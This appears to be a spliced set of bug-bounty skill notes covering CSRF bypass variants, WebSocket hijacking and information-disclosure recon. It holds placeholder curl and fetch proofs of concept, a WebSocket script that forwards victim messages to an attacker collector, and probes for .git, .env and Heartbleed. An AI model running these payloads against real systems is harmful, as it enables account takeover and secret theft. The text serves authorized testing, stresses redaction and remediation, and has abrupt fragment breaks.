2. Stripping vectors, verified in a browser: attacker page with `<meta name="referrer" content="no-referrer">` (kills outbound `Referer`), sandboxed iframe → `Origin: null`; capture what each browser actually sent.
3. Confirm whether the server rejects *both* headers absent at all (curl with neither — if it passes, "missing = allowed" is the whole story).
4. If the same helper gates CORS, escalate to V-14 — looseness there permits cross-origin *reads*.

**Proof of concept:**
```bash
curl -sS -b '<COOKIE>' -X POST 'https://<TARGET_HOST>/<PATH>' \
  -H 'Origin: https://<TARGET_HOST>.evil.tld' --data '<PARAM>=<VALUE>'   # regex-buster
curl -sS -b '<COOKIE>' -X POST 'https://<TARGET_HOST>/<PATH>' \
  --data '<PARAM>=<VALUE>'                                               # headers absent

## [Bugbountyskills.md] browser: <iframe sandbox="allow-forms allow-scripts" srcdoc="…auto-submit form…"> → Origin: null

```

**Confirm:** a **browser-reachable** bypass — `Origin: null` from a sandboxed iframe, a regex-satisfiable origin, or a genuinely stripped `Referer` on a navigation — **plus** the persisted state change. Curl-spoofed Origins cannot harm browser victims and are leads by themselves.

**False positives:** the classic — `curl -H 'Origin: https://target'` accepted proves nothing, because a cross-site page cannot emit an arbitrary Origin (only null/stripped/regex paths a browser can produce are findings); **"no Origin header → 200" does not mean Origin is unchecked** — Rails' `config.action_controller.forgery_protection_origin_check` (and most frameworks) evaluates Origin *only when the header is present*, so the correct control set is three-armed: (a) valid token + **wrong** Origin → must be rejected, (b) valid token + **no** Origin → often accepted by design, (c) no token → rejected. Seen 2026-10-25 on reready.co: (a)=422, (b)=200, (c)=422 — reading only (b) would have filed a nonexistent "Origin not validated" finding; the 422 body is generic, so the *status differential between (a) and (b)* is the evidence, not the body text; a check that merely *logs* bad origins while a token still validates (test each control independently); the *target's* own `Referrer-Policy` settings (your attacker page's policy is what governs its outgoing headers); a loose match on a non-security header like `X-Forwarded-Host` used only for URL building (no security decision → no finding); Safari ITP stripping `Referer` only for cross-site subresources — retest the exact vector in the claimed browser.

**Impact:** origin-restricted endpoints become CSRF-able cross-site with zero token knowledge; where the same matcher feeds CORS, severity escalates through V-14.

**Remediation:** parse both headers as URLs and compare scheme+host+port against an exact allow-list with anchored, normalized equality (no `contains`, no unanchored regex), reject absent/`null` values on state-changing requests, and validate the token too.

**CWE / OWASP:** CWE-352, CWE-183 (Permissive List of Allowed Inputs), CWE-20; OWASP A01 (legacy A8:2017).

---

## [Bugbountyskills.md] V-12: Content-Type manipulation and multipart reshaping

**Also known as:** classic "Content-Type manipulation" / v2.1 "Content-Type manipulation evasion using text/plain multipart form reshaping".
**Mechanism:** the anti-CSRF check keys on a specific `Content-Type` (skip validation for "API" types) while the parser still accepts others — or the WAF signs urlencoded bodies only. Reshaping to `text/plain` or `multipart/form-data` (both CORS **simple** types → no preflight) keeps the request cross-origin-fireable while slipping past check and filter. Violated assumption: "Content-Type identifies the request class."

**Preconditions:**
- No strict Content-Type allow-list enforced *before* parsing (Rails, PHP, wildcard Express `body-parser({type:'*/*'})` all auto-detect).
- Validation branches on Content-Type ("only urlencoded posts need tokens") or a WAF signs on one shape; victim cookie rides (V-03 posture).

**Detect:**
1. Baseline urlencoded request → replay with each CT, one variable at a time, recording **status + body + side effect**: `application/x-www-form-urlencoded; charset=utf-8`, `multipart/form-data; boundary=…`, `text/plain`, `application/json`, `text/html` (charset griefing like `charset=ibm037` only on legacy .NET/PHP stacks — note stack first).
2. For multipart preserve field names exactly (`curl -F 'param=value'`); verify the handler consumed the fields via side effect, not 200.
3. Watch the validation branch: if `text/plain` skips the token error **and** still mutates, both halves are proven.
4. Browser-side: confirm no preflight for the winning type (network shows no OPTIONS) — that is the exploitability claim (WAF-evasion encodings: `payloads.md` table).

**Proof of concept:**
```bash
curl -sS -b '<COOKIE>' -X POST 'https://<TARGET_HOST>/<PATH>' \
  -H 'Content-Type: text/plain' -H 'Origin: https://<ATTACKER_ORIGIN>' \
  --data '<BUSINESS_PARAM>=<VALUE>'
```
```js
fetch('https://<TARGET_HOST>/<PATH>', { method:'POST', mode:'no-cors', credentials:'include',
  headers:{'Content-Type':'text/plain'}, body:'<BUSINESS_PARAM>=<VALUE>' });
```

**Confirm:** the cross-origin browser request with the shaped CT mutates **without a preflight** (network evidence), the state change persists on re-fetch as victim, and the differential against the token-checked baseline CT is documented.

**False positives:** 200 whose body is `{"error":"unsupported content type"}` (status lies — read it); WAF dropping the body so origin never sees it (check origin side / repeat with evasion); "no preflight" claimed without confirming the server *parsed* the body — preflight avoidance without parse acceptance is not a finding, and juniors stop exactly there; multipart firing while a token you copied from history silently validated (strip all carriers); tooling-normalized bytes — replay raw before claiming parser griefing.

**Impact:** converts token-gated or preflight-gated endpoints into fire-and-forget cross-origin writes, and is the standard WAF-signature evasion for V-01 payloads.

**Remediation:** enforce an explicit Content-Type allow-list (415 everything else) *before* body parsing, and validate tokens independent of Content-Type.

**CWE / OWASP:** CWE-352, CWE-20, CWE-436 (Interpretation Conflict); OWASP A01 (legacy A8:2017).

---

## [Bugbountyskills.md] V-13: JSON and form tunnelling with parser flexibility

**Also known as:** classic "JSON/form tunnelling" / v2.1 "Client-side JSON-to-form tunneling parsing flexibility evasion".
**Mechanism:** the same state change is reachable through a second, less-guarded representation — JSON routes exempted from CSRF middleware on the myth that "browsers can't send JSON cross-origin" (they can: `text/plain` carrying a JSON body, a CORS simple request), or form endpoints whose framework deserializes JSON bodies (type sniffing, wildcard `type:'*/*'` parsers, Rails parameter formats). Violated assumption: "the content type the UI sends is the only one the server handles."

**Preconditions:**
- CSRF middleware exempts `application/json`, or one handler reads both representations (Express `express.json({type:'*/*'})`, Koa, Laravel `Request::json()`, Django DRF variants are the usual homes).
- Parser coerces strings to objects (or objects to fields) without re-running checks; cookie rides (V-03) and the request is simple or the preflight passes (V-14).

**Detect:**
1. Matrix on one endpoint: {urlencoded, JSON, multipart, text/plain-with-JSON, text/plain-with-urlencoded} × {token present, token absent} — the finding is a cell that mutates with the token absent under a non-UI representation.
2. Wildcard-parser probe: `Content-Type: text/plain` + raw JSON body — if fields land in the handler, sniffing is on. Reverse too: urlencoded into a JSON-only endpoint.
3. Framework specifics: Rails `_method` + `format=json`, Laravel `X-HTTP-Method-Override`, ASP.NET `[FromBody]` vs form binding; strip `X-Requested-With` — many JSON "CSRF protections" are only that header.
4. Read what actually arrived server-side (logs/body echo), not just what your tool sent.

**Proof of concept:**
```bash
curl -sS -b '<COOKIE>' -X POST 'https://<TARGET_HOST>/<API_PATH>' \
  -H 'Content-Type: text/plain' -H 'Origin: https://<ATTACKER_ORIGIN>' \
  --data '{"<BUSINESS_PARAM>":"<VALUE>"}'
curl -sS -b '<COOKIE>' -X POST 'https://<TARGET_HOST>/<FORM_PATH>' \
  -H 'Content-Type: application/json' --data '{"<BUSINESS_PARAM>":"<VALUE>"}'
```

**Confirm:** network capture showing the tunnelling request is preflight-free (or preflight passed *and* the browser read the response — different claims, prove the one you report), the persisted state change on re-fetch, and the matrix cell showing the token was not consulted.

**False positives:** the most-reported one — `application/json` *is* preflight-triggering, curl "worked" only because curl ignores CORS, and the browser blocked nothing executed (retest in-browser); JSON parsed but a token your tooling carried from history still validated (strip every carrier); body sniffed yet a downstream validator rejected unknown fields (read the side effect, not parse logs); `mode:'no-cors'` downgrading the CT to `text/plain` — confirm what the origin actually received.

**Impact:** defeats the "JSON endpoints are CSRF-immune" design assumption on SPA APIs — the most common modern surface; include the accepted-representation matrix so remediation covers every parser path.

**Remediation:** require token/Origin validation on all state-changing routes regardless of representation, parse bodies with explicit type allow-lists (never wildcard), and keep token checks independent of parser choice.

**CWE / OWASP:** CWE-352, CWE-436 (Interpretation Conflict); OWASP A01 (legacy A8:2017).

---

## [Bugbountyskills.md] V-16: Cross Site WebSocket Hijacking

**Also known as:** v2.1 "Cross-Site WebSocket Hijacking (CSWSH) via missing origin verification handshake protocols".
**Mechanism:** a WebSocket handshake is a GET `Upgrade` — no preflight, no custom-header capability, cookies attached per SameSite rules — yet many servers authenticate it purely with the session cookie and never check the `Origin` browsers reliably set. An attacker page opens `new WebSocket("wss://app/ws")`, inherits the victim's authenticated socket, and reads/writes live messages. Violated assumption: "SOP covers WebSockets" (it does not; only the server's Origin check does).

**Preconditions:**
- WS authed by cookie/session, not a one-time server-issued `?ticket=` grant (that design is CSWSH-resistant).
- No (or loose — see V-11) `Origin` validation at handshake; cookie rides the cross-site handshake: `SameSite=None; Secure`, same-site attacker (V-04), or legacy browser — a Lax/Strict cookie will not accompany a cross-site handshake in modern browsers.
- Messages authorize by connection, not per-message identity (server trusts the socket was vetted).

**Detect:**
1. Capture the legit handshake (`GET /path Upgrade: websocket`); identify what actually authenticates it — cookies? `Sec-WebSocket-Protocol` token? query ticket? (If ticket-only and unguessable, CSWSH-resistant.)
2. Replay from curl varying `Origin` (absent, `https://evil.tld`, `null`, wrong host) and cookie; 101 to *any* Origin is the core signal — but a 101 alone is a weak lead until a frame does something.
3. Browser test: `new WebSocket(url)` from an attacker page in a clean profile logged into the app; log `onopen`/`onmessage` and confirm the session cookie rode the handshake in DevTools.
4. Map the message surface: which inbound frames mutate state or return personal data (chat, notifications, order feed, admin events), and what each assumes about identity.

**Proof of concept:**
```html
<script>
  const ws = new WebSocket('wss://<TARGET_HOST>/ws');
  ws.onopen = () => ws.send('{"action":"<MUTATION_OR_QUERY>","<PARAM>":"<VALUE>"}');
  ws.onmessage = ev => fetch('https://<ATTACKER_COLLECTOR>',{method:'POST',mode:'no-cors',body:ev.data});
</script>
```

**Confirm:** victim-specific data received *from an attacker-origin page* (read leg) or a victim-visible effect from an injected frame (write leg) in a real browser, **and** the handshake capture showing no server-side Origin rejection. Both — status alone is a lead.

**False positives:** ticket/nonce auth the attacker cannot know (verify what actually authenticates before writing); `Origin` checked-but-logged (101 still appears — test with a mutating frame); `SameSite=Lax` meaning your cross-site handshake carried **no** cookie — if `onopen` never yields victim data you have nothing; message-level authz rejecting all attacker frames (then only connection-state exposure — say exactly that); `wss://` mixed-content/self-signed blocking the PoC in-browser (test artifact — retest from an https attacker page).

**Impact:** live cross-origin read/write of the victim's real-time channel — messages, notifications, account events, trading/order flow; where frames carry tokens or PII, escalate to data-exfiltration severity; write legs inherit whatever the socket can do.

**Remediation:** validate `Origin` (exact allow-list) at handshake time or authenticate the socket with a short-lived single-use ticket instead of cookies, and enforce per-message authorization tied to the socket identity.

**CWE / OWASP:** CWE-352, CWE-346, CWE-1385 (Missing Origin Checking in WebSockets); OWASP A01 (legacy A8:2017).

---

## [Bugbountyskills.md] fixate <T_FIX> (+SID) onto victim, victim logs in, then:

curl -sS -b 'session=<VICTIM_SID>' -X POST 'https://<TARGET_HOST>/<PATH>' \
  --data 'csrf_token=<T_FIX>&<BUSINESS_PARAM>=<VALUE>'
```

**Confirm:** a controlled two-profile repro where the pre-auth token (or attacker-supplied value) is shown to validate **after** the victim's login — scripted end to end, not inferred from missing rotation alone — plus the persisted state change from a cross-origin page using that known token.

**False positives:** "token unchanged" while the session id rotated and the token is an HMAC of it (old token then dies — *use* it, don't compare strings); double-submit frameworks that legitimately never rotate the UX cookie while a real server-side check does (strip and retest); fixation reported when the app regenerates on login but your client pinned the SID manually (regeneration is the fix — verify the value actually changes from the victim's browser); login CSRF where anonymous sessions are intentionally allowed (prove an *authenticated* action runs under attacker-known state).

**Impact:** collapses CSRF protection for the entire authenticated session and usually opens login CSRF → chained account actions under attacker-known state (recipient changes, API keys, OAuth grants); title it "CSRF token/session not regenerated on authentication" with the two-profile chain in the repro.

**Remediation:** regenerate the session id and reissue the CSRF token on every authentication and privilege transition, and never accept client-supplied token values as authoritative — always server-generate.

**CWE / OWASP:** CWE-384 (Session Fixation), CWE-352, CWE-613 (Insufficient Session Expiration); OWASP A01 (legacy A8:2017, A2:2017 Broken Authentication).

---

## [Bugbountyskills.md] 2. Engagement workflow

1. **Recon & surface inventory.** Collect every host, path, and artifact the target
   exposes: domains and subdomains, response headers on every response you already
   have, JS bundles, downloaded documents, error pages triggered during normal
   browsing, and any storage/API endpoints. *Why:* disclosure hunting is mostly
   passive — the richest leaks (banners, source maps, headers) arrive for free before
   you probe anything.

2. **Path & artifact sweep.** Run the recon wordlists in `payloads.md` §1 against
   in-scope hosts (`/git/HEAD`, `/.env`, `/backup.zip`, `/.map`, `/swagger.json`,
   `/logs/`, etc.). Record status **and** content-type **and** body hash — a 200 is
   not a finding, it is a lead. *Why:* soft-404s, catch-all marketing pages, and WAF
   interstitials return 200 for everything; only body inspection separates them from
   real exposures.

3. **Variant selection.** Use the routing table in §3 to map each observed signal to
   1-2 variants and read the matching section in `references/variants-1.md` or
   `references/variants-2.md` before improvising — each has preconditions and
   false-positive traps that will burn your credibility if skipped.

4. **Safe verification.** Confirm each lead with the minimal read the variant calls
   for: pull `.git/HEAD` and one object, fetch one sourcemap, run one introspection
   query, list one bucket. No bulk harvesting yet. *Why:* you need to know the lead is
   real before you invest — and some "exposures" (honeypot git dirs, sample buckets)
   are traps that waste hours.

5. **Sensitivity triage (the step juniors skip).** Ask: what did this actually expose?
   Version string only → usually informational, not reportable alone. Source code with
   a hardcoded production credential → high. Public directory listing of backup files
   containing user data → high/critical. A 403'd bucket → not a bug. A public bucket
   with PII → report it. Classify each confirmed leak against the impact bar in §4
   before spending more time on it. *Why:* programs triage hundreds of "your nginx
   version is visible" reports; teaching yourself the line now saves everyone.

6. **Impact proof (minimal, redacted).** Prove capability, not haul: demonstrate the
   `.git` is fully recoverable by checking out one file, show the first redacted
   secret found in `.env`, extract one introspection field that proves schema access,
   or show one bucket object listing. Do not exfiltrate user data to prove user data
   is exposed — the listing plus one redacted example is the proof.

7. **False-positive filter.** Rule out: soft-404 pages, default install artifacts
   (Tomcat example pages, phpinfo left by a framework), synthetic/lab data, honeypot
   repos, cached CDN copies of removed files (check origin vs cache headers), secrets
   that are public by design (published PGP keys, OAuth client IDs, mobile app
   embedded keys documented as public), and staging/test environments explicitly
   excluded by scope. Re-fetch with cache-busting headers before claiming a live leak.

8. **Report.** Write it with the template in §5: exact request, redacted evidence,
   the data *class* exposed (not the data itself), and remediation naming the actual
   root cause (file served by webroot, debug flag on, bucket ACL, missing authz on
   the introspection endpoint).

## [Bugbountyskills.md] 3. Variant selection table

| Signal you observed | Likely variant | Reference |
|---|---|---|
| `/git/HEAD` returns `ref: refs/heads/…`; `.svn`, `.bak`, `.old` files download | Exposed VCS repos / backup files | `references/variants-1.md` §V-01 |
| `Server:`, `X-Powered-By:`, `X-AspNet-Version:` or odd micro-service headers reveal versions/infrastructure | Server banner & infrastructure footprinting | `references/variants-1.md` §V-02 |
| Stack traces, framework debug pages, `Whoops`, Django DEBUG, JSP dumps on error | Debug exception / stack trace leak | `references/variants-1.md` §V-03 |
| Responses embed internal IPs (10.x, 172.16-31.x, 192.168.x, 127.x), internal hostnames in redirects/errors/HTML comments | Internal IP / network schema leakage | `references/variants-1.md` §V-04 |
| `Index of /` listings, autoindex, listing filters expose files not linked anywhere | Unprotected directory indexing | `references/variants-1.md` §V-05 |
| Keys/tokens in JS bundles, mobile APKs, page source, client configs (`apiKey`, `aws_secret`, JWT signing key) | Hardcoded keys / client secrets | `references/variants-1.md` §V-06 |
| `{"data": {"__schema": …}}` returned for an introspection query | GraphQL introspection leakage | `references/variants-1.md` §V-07 |
| TLS heartbeat responds with extra process memory; openssl `heartbeat` probe returns adjacent heap | Heartbleed-style memory extraction | `references/variants-1.md` §V-08 |
| `//# sourceMappingURL=` comments, `.js.map` files fetchable, `sourcesContent` present | Client-side source map leakage | `references/variants-2.md` §V-09 |
| `s3.amazonaws.com`, `storage.googleapis.com`, `s3://` URLs; bucket listable or objects world-readable | Open cloud storage bucket | `references/variants-2.md` §V-10 |
| `/.env`, `/config.json`, `application.yml`, `settings.py` downloadable with real secrets | Exposed environment/config files | `references/variants-2.md` §V-11 |
| `/swagger.json`, `/openapi.json`, `/api-docs`, `/v2/api-docs`, Postman collection URLs respond | Public API documentation (Swagger/Postman) | `references/variants-2.md` §V-12 |
| `/logs/`, `/log/`, `error.log`, `access.log` fetchable; log directories autoindexed | Verbose log file leakage | `references/variants-2.md` §V-13 |
| Email headers expose `X-Originating-IP`, internal mail hosts (`*.internal`, `*.corp`, `mail01`), SMTP banners | Internal domain via SMTP/email headers | `references/variants-2.md` §V-14 |
| Uploaded/downloadable images or docs carry EXIF (GPS, device, author, internal paths) | Document metadata (EXIF) extraction | `references/variants-2.md` §V-15 |
| Anything found in JS bundles or downloaded files that feeds another class of attack | Chain: credentials → `sqli-testing`, IDs → `bac-idor-testing`, internal hosts → `ssrf-testing` | `references/payloads.md` §7 |

## [Bugbountyskills.md] 4. Verification standard

A **confirmed finding** requires all three:

1. **Reproducible request/response pair** — the exact URL/method/headers, plus the
   response (or headers) demonstrating the disclosure, reproducible 3× from a clean
   session. For file/git/bucket work, include the command template with placeholders
   and the observed output, redacted.
2. **A demonstrated data class** — not just "the endpoint responds", but a statement
   of *what* leaked: source code, credential, internal IP, PII, schema, memory
   fragment. Name the class; never paste the payload of the secret itself.
3. **A false-positive check** — evidence it is not a soft-404, honeypot, cached
   remnant, public-by-design artifact, or sample data. Note what you ruled out.

A **lead** (not reportable alone): a 200 on a probe path with no interesting body, a
banner showing only `nginx` with no version, a directory listing with only public
assets, introspection disabled but a GraphQL endpoint present, a bucket that returns
`AccessDenied`/403, an error page with no trace. Escalate leads with the next rung of
the variant's Detect steps, or discard.

Severity framing: exposed `.git`/credentials/PII/production secrets → high-critical
(context-dependent); full introspection schema on a production API → medium (raise if
it reveals privileged mutations or authz-sensitive fields); stack trace with internal
paths/IPs → low-medium; banners and versions alone → informational (usually not worth
reporting alone unless paired with a known CVE in that exact version); EXIF with GPS
→ medium, EXIF with only camera model → informational. Programs frequently pay only
for the higher tiers — triage accordingly before reporting.

## [Bugbountyskills.md] <Class> exposed via <mechanism> at <location>

**Severity:** <High/Medium/Low — CVSS vector if the program wants it>
**Endpoint:** `https://<target.example>/<path>` (auth: <none/cookie/token>)
**Summary:** <Path/endpoint/artifact> is served without access control and discloses
<redacted data class: e.g. a full Git repository / a production API key pattern /
a listing of user-uploading objects>. Reproduced <N>× from an unauthenticated session.

## [Bugbountyskills.md] Steps to reproduce

1. Visit `https://<target.example>/<path>` with a plain unauthenticated request.
2. Request follows (placeholders filled in):
   ```http
   <GET /<path> HTTP/1.1>
   Host: <target.example>
   ```
3. Observe: <response body/headers> contain <evidence description>. Content-class:
   <what it proves>.

## [Bugbountyskills.md] Impact

<Concrete attacker capability, e.g. "Any unauthenticated visitor can reconstruct the
full application source via Git object recovery and has obtained <N> live credentials
from .env, granting <access level> to <system>."> State auth level required (none).

## [Bugbountyskills.md] Remediation

<Specific root cause fix: remove deployed artifacts from webroot (.git, .env, backups),
disable directory listing and debug mode, add authz on the endpoint, bucket policy
with public-access-block, rotate the exposed credential — rotation is part of the fix.>

## [Bugbountyskills.md] References

- CWE-538 / CWE-200 / CWE-540 (source code on web server), CWE-798 (hardcoded credentials), CWE-209 (error exposure)
- OWASP A01:2021 Broken Access Control; WSTG-INFO-* (fingerprinting, enumerate application)
```

## [Bugbountyskills.md] 6. Reference pointers

Read `references/variants-1.md` for variants 1-8 and `references/variants-2.md` for
variants 9-15; each file opens with a table of contents linking every section. Read
`references/payloads.md` when you need the recon path wordlists (git/env/backup/
sourcemap/swagger/log candidates), the `.git` exposure validation procedure
(including the soft-404 gotcha), curl capture templates with `<PLACEHOLDER>` slots,
the S3/GCP bucket enumeration-and-verify procedure, the secret redaction checklist,
or the "chain it with" cross-skill notes.

The suite cross-references by directory name: leaked schema and credentials feed
`sqli-testing` (pair table names with `.env` DB credentials); leaked IDs and GraphQL
nodes feed `bac-idor-testing` (BOLA on object IDs); leaked internal hosts and
metadata endpoints feed `ssrf-testing` (cloud metadata, internal pivots); leaked
file paths and backup filenames feed `path-traversal-testing` (which file params can
be forced to read them). Disclosure is rarely the end of an attack chain — it is the
map.

## [Bugbountyskills.md] Table of contents

1. [Recon path catalog (wordlists with placeholders)](#1-recon-path-catalog-wordlists-with-placeholders)
2. [.git exposure validation: real HEAD/objects vs soft-404 and honeypots](#2-git-exposure-validation-real-headobjects-vs-soft-404-and-honeypots)
3. [curl capture templates: headers, banners, sourcemaps](#3-curl-capture-templates-headers-banners-sourcemaps)
4. [S3/GCP bucket enumeration & verify (read-only procedure)](#4-s3gcp-bucket-enumeration--verify-read-only-procedure)
5. [Tool invocation templates & path-probe evasion notes](#5-tool-invocation-templates--path-probe-evasion-notes)
6. [Redaction checklist for discovered secrets](#6-redaction-checklist-for-discovered-secrets)
7. [Chain it with (suite cross-references)](#7-chain-it-with-suite-cross-references)

---

## [Bugbountyskills.md] 2. .git exposure validation: real HEAD/objects vs soft-404 and honeypots

**The soft-404 gotcha — read this before celebrating any 200.** SPAs, CDNs, and
"friendly" servers return **HTTP 200 with an HTML page** for paths that do not exist
(the app's router catches `/*`, or a WAF renders a styled block page, or nginx
`error_page 404 =200 /index.html` is set). Naive scanners report `/.git/HEAD → 200`
on every such site. A real `.git/HEAD` is a *17–41 byte text file*, not HTML. Status
code proves nothing here — **content structure proves everything.**

Validation ladder (stop at the first failure — it's a lead, not a finding):

1. **Fetch HEAD raw, no interpretation.**
   ```bash
   curl -sS -i "<BASE>/.git/HEAD"
   ```
   - **Real:** body is exactly `ref: refs/heads/<branch>\n` or a bare 40-hex SHA;
     `Content-Type: text/plain` (or no type).
   - **Soft-404:** `<!DOCTYPE html>…`, `<title>…</title>`, SPA shell, WAF interstitial,
     or an error page that happens to be 200. Bail: not git.
2. **Fetch `/.git/config`.** Real config has `[core]`, `[remote "origin"]` with a real
   URL, and a `[branch …]` section. Honeypots and stub pages rarely forge this.
   Record the `remote.origin.url` — it often leaks an internal Git host (V-04) or a
   repo name (V-06-adjacent).
3. **Fetch a real object.** Parse `/.git/index` or use `git ls-remote`-style reads:
   pick one SHA from `/.git/logs/HEAD` (contains `<old> <new> <committer>` lines) and
   GET `/.git/objects/<first-2-chars>/<remaining-38>` — expect `gzip` magic bytes
   (`1f 8b`), which `file` reports as gzip. A 404/HTML here means HEAD was a **honeypot**
   (planted HEAD with no objects — a tripwire; don't waste time, and don't trip it
   repeatedly).
4. **Cross-check with a second signal** (per `SKILL.md` §4): `/.git/logs/HEAD`
   timestamps + a recovered file whose content matches the live site (or predates it).
   Two independent artifacts agreeing = confirmed exposure.
5. **Only now escalate** to recovery (`git-dumper`, §5) — read-only checkout, then
   `git log` for history. Proof of capability = one recovered file + history count,
   not a full dump pasted into the report.

Same ladder generalizes: `.svn/wc.db` must be SQLite (`file` → `SQLite 3x database`),
`.DS_Store` must be binary DS_Store (magic `Bud1`), `.env` must contain `KEY=value`
lines with non-empty values (an `.env.example` with blanks is a template, not a
finding), `*.js.map` must parse as JSON with `version`/`mappings` keys.

---

## [Bugbountyskills.md] 3. curl capture templates: headers, banners, sourcemaps

All templates read-only; `<PLACEHOLDER>` slots filled per engagement. `-i` includes
status+headers; `-sS` silences progress but shows errors; `--compressed` avoids
misreading gzip bodies; `-H 'Cache-Control: no-cache'` re-validates against CDN caches
before you claim a *live* leak (cached removals are stale — check `Age:`/`X-Cache:`).

**Header/banner capture (V-02/V-04):**
```bash
curl -sS -i --compressed "<BASE>/<path>" -H 'Cache-Control: no-cache' \
  | tee <headers-<path>.txt>          # save: status, Server, X-Powered-By, Via, internal hosts
curl -sS -o /dev/null -D - "<BASE>/"   # homepage header snapshot only
```
Compare across 3-5 paths (home, API, error-trigger, static): backends behind CDNs
leak *different* headers per route.

**Banner/version trigger (error-path banners, V-02/V-03):**
```bash
curl -sS -i -X OPTIONS "<BASE>/<api-path>"
curl -sS -i -H 'Content-Type: application/json' -d '{invalid json>' "<BASE>/<api-path>"
```

**Sourcemap capture (V-09):**
```bash

## [Bugbountyskills.md] 2) fetch and validate structure

curl -sS -i "<BASE>/<asset>.js.map" | head -c 200      # expect JSON: {"version":3,...}
curl -sS "<BASE>/<asset>.js.map" | jq -r '.sources[]'  # original file tree
curl -sS "<BASE>/<asset>.js.map" | jq -r '.sourcesContent[]' \
  | grep -nE '<secret-pattern>'                        # grep locally, redact on report
```

**Stack trace / config capture (V-03/V-11):**
```bash
curl -sS -i -H 'Content-Type: application/json' -d '{"<known-param>":null}' "<BASE>/<path>" > trace.txt
curl -sS -i "<BASE>/.env" | head -n 40                 # status + first lines; mask values immediately
```

**Heartbleed single probe (V-08) — one run, not a loop:**
```bash
nmap -p <PORT> --script ssl-heartbleed <TARGET.HOST>   # confirms; do not repeat against prod
```

---

## [Bugbountyskills.md] 200 + Content-Type + ETag → world-readable object even with listing denied

## [Bugbountyskills.md] 403 AccessDenied → read blocked; 404 → key wrong

```
Pull *at most* what's needed to classify the content (first lines/header of one
object). If listing was denied but a key you got from their own HTML reads fine,
that's still a finding — key-guessing just got a bootstrap.

**Step 4 — GCP: same three probes.**
```bash
curl -sS -i "https://storage.googleapis.com/<BUCKET>/?maxResults=5"      # JSON list
curl -sS -i "https://storage.googleapis.com/<BUCKET>/<known-object>"     # object read

## [Bugbountyskills.md] 6. Redaction checklist for discovered secrets

Run this before writing a single byte of a report, ticket, or chat message. The rule:
**report the type + location, never the live value.** A report containing the
credential it discloses is itself a disclosure incident.

- [ ] **No raw secrets anywhere:** keys, passwords, connection strings, session tokens,
      private keys, cookies, EXIF GPS/person names, and other users' PII are masked —
      not in the report body, evidence blocks, screenshots, or attachments.
- [ ] **Mask by pattern + shape, keep recognition value:** first 4 chars + ellipsis +
      length/charset note where the prefix identifies the service —
      `AKIA••••••••7Q (16 chars, AWS)` · `ghp_•••••••• (40 chars, GitHub PAT)` ·
      `postgres://app@<db-host>:5432/•••• (password omitted, 22 chars)` ·
      `JWT HS256 secret: •••• (32 chars, high-entropy)` · `eyJ•••.eyJ•••.••• (RS256)`.
- [ ] **Location is always included:** file/endpoint URL, JS asset + byte offset or
      line, `.env` key *name* (`DB_PASSWORD=`), git path+commit, bucket + object key
      pattern, log file + date range. Location without value = actionable for the
      fixer, useless to an attacker.
- [ ] **Hash instead of value when needed:** `sha256:ab12…` of the secret lets the
      vendor match it to their store without learning it (say in the report that this
      is a hash, not the secret).
- [ ] **Capability > content:** describe what the secret *would* do ("signs session
      tokens", "grants list+read on <bucket>"), proven read-only; never attach the
      proof-of-content (dumped rows, memory bytes, full EXIF values).
- [ ] **PII & third-party data:** other users' documents/emails/metadata stay *out* of
      evidence — describe class + count ("1,204 records with email+name fields").
- [ ] **Screenshots scrubbed:** no browser-tabs with internal URLs visible, no auth
      headers in captured requests, no tool output panels showing unmasked values.
- [ ] **Attachments scanned:** grep the final report file itself for the secret patterns
      from §1 before submitting — one `grep -E '<your-found-pattern>' report.md` sweep.
- [ ] **Rotation call-to-action:** remediation says *rotate* the exposed credential —
      exposure time unknown, so assume compromised.
- [ ] **Program channel rules:** if the program restricts evidence sharing (redaction
      required, no secret storage on their ticket system), follow that over any
      convenience — offer the hash + a private channel per their policy.

---

## [Bugbountyskills.md] 7. Chain it with (suite cross-references)

Disclosure findings are usually the *map*, not the endpoint. Point each confirmed leak
at the right sibling skill:

- **`sqli-testing` — schema + credential combos.** A leaked `.env`/config (V-11) with
  `DB_HOST`/`DB_PASSWORD` plus an error-leaked query shape (V-03) is exactly the
  pairing that skill's §1/§2 expect: the stack trace names the DBMS and table, the
  config supplies the connection context. Exposed `.git` history containing old
  query code, and GraphQL schema field lists (V-07) feeding `WHERE`-column guesses,
  all route there.
- **`bac-idor-testing` — leaked IDs and GraphQL nodes.** Introspection dumps (V-07)
  and API specs (V-12) hand over the object types and parameter names
  (`/orders/{orderId}`); directory listings and docs leak real record IDs. That skill
  does the access-control probing — this skill only delivers the map. Also the right
  target for leaked JWT secrets from V-06 (token forging is *its* authorization-jwt
  territory, do not forge against real sessions without explicit scope).
- **`ssrf-testing` — metadata endpoints and internal hosts.** Internal IPs and
  hostnames from V-04, `X-Originating-IP` from V-14, `.env` URLs to internal admin
  panels from V-11, and `169.254.169.254`-shaped addresses are the *target list* for
  SSRF work — including cloud metadata (`/latest/meta-data/iam/…`) reachable once an
  SSRF exists. Config files may also reveal command-injection-adjacent paths (cron,
  webhook URLs) for that skill's RCE side.
- **`path-traversal-testing` — leaked file paths and backups.** Stack traces (V-03)
  and `.env`/config (V-11) name absolute paths (`/var/www/app/config.ini`); directory
  listings (V-05) and backup files (V-01) tell you *which* files exist and are worth
  forcing a file parameter to read. It turns "we know the path" into "we can read
  arbitrary paths", and covers wrappers/log-poisoning follow-ons.

Adjacent suite notes (secondary): leaked admin endpoints from V-12 also feed
`business-logic-testing` (abuse of exposed workflows); frontend comments recovered via
V-09 may reveal XSS/CSRF sinks worth a look under `xss-testing`/`csrf-testing`; and if
V-06 dumps a *sandbox/runtime* key or Wasm/JS engine config, `sandbox-escape-testing`
is the follow-on. Route by what the leak *enables*, not by the leak's own CWE.

## [Bugbountyskills.md] Table of contents

- [V-01: Exposed version control repositories and backup management leakage](#v-01-exposed-version-control-repositories-and-backup-management-leakage)
- [V-02: Server banner response modification and micro-service infrastructure footprinting](#v-02-server-banner-response-modification-and-micro-service-infrastructure-footprinting)
- [V-03: Detailed debugging exception extraction via stack trace disclosures](#v-03-detailed-debugging-exception-extraction-via-stack-trace-disclosures)
- [V-04: Internal network schema mapping via server-leaked IP address points](#v-04-internal-network-schema-mapping-via-server-leaked-ip-address-points)
- [V-05: Arbitrary resource harvesting via unprotected directory indexing filters](#v-05-arbitrary-resource-harvesting-via-unprotected-directory-indexing-filters)
- [V-06: Hardcoded sensitive cryptographic keys, client secrets and token extraction](#v-06-hardcoded-sensitive-cryptographic-keys-client-secrets-and-token-extraction)
- [V-07: GraphQL introspection query data schema leakage exploitation](#v-07-graphql-introspection-query-data-schema-leakage-exploitation)
